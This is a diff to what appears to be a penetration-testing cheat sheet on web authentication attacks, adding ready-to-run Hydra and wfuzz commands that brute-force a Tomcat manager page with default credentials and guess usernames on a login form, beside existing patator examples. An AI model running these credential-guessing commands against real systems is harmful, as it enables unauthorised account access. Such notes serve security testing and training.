@@ -6,7 +6,11 @@
 
 ### HTTP Basic Authentication
 
+HTTP Basic Authentication with Hydra:
 
+```text
+hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.10:8080/manager/html
+```
 
 ### Login Forms
 
@@ -68,6 +72,14 @@ A few examples of an HTTP authentication dictionary attack: \(Change the paramet
 patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt -x ignore:fgrep='Invalid User'
 patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 -x ignore:fgrep='Invalid User'
 patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid User'
+```
+
+**wfuzz**
+
+A few examples of an HTTP authentication dictionary attack: \(Change the parameters and their values\)
+
+```text
+wfuzz -c -w names.txt -d "username=FUZZ&password=password" http://10.10.10.10/login.php
 ```
 
 ### Enumerating Usernames via Cookie Values
